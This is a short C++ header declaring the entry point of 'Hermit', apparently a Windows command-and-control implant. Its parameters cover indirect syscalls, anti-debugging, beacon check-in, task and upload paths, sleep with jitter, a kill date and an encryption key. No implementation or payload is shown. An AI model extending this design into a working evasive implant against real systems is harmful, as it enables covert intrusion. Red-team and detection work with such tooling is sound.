#ifndef HERMIT_HERMIT_HPP
#define HERMIT_HERMIT_HPP

#include "core/handler.hpp"
#include "core/utils.hpp"

#define DLL_QUERY_HMODULE 6

namespace Hermit
{
	VOID Run(
		HINSTANCE       hInstance,
		INT             nCmdShow,
		LPCWSTR			lpPayloadType,
		BOOL			bIndirectSyscalls,
		BOOL			bAntiDebug,
		LPCWSTR			lpProtocol,
		LPCWSTR 		lpHost,
		INTERNET_PORT 	nPort,
		LPCWSTR 		lpReqPathCheckIn,
		LPCWSTR			lpReqPathDownload,
		LPCWSTR 		lpReqPathTaskGet,
		LPCWSTR 		lpReqPathTaskResult,
		LPCWSTR			lpReqPathUpload,
		LPCWSTR			lpReqPathWebSocket,
		INT 			nSleep,
		INT				nJitter,
		INT				nKillDate,
		LPCWSTR			lpKey,
		LPCWSTR			lpIV
	);
}

#endif // HERMIT_HERMIT_HPP